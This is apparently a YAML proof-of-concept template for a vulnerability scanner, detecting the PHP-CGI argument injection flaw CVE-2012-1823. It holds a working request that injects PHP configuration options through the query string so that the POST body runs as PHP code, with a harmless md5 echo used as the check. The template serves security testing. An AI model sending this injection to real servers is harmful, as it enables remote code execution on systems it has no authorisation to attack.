detail:
  author: 17bdw
  links:
  - https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823
expression: r0()
manual: true
name: poc-yaml-php-cgi-cve-2012-1823
rules:
  r0:
    expression: response.body.bcontains(bytes(md5(string(rand))))
    request:
      body: <?php echo md5({{rand}}); ?>
      cache: true
      follow_redirects: false
      method: POST
      path: /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
set:
  rand: randomInt(200000000, 210000000)
transport: http
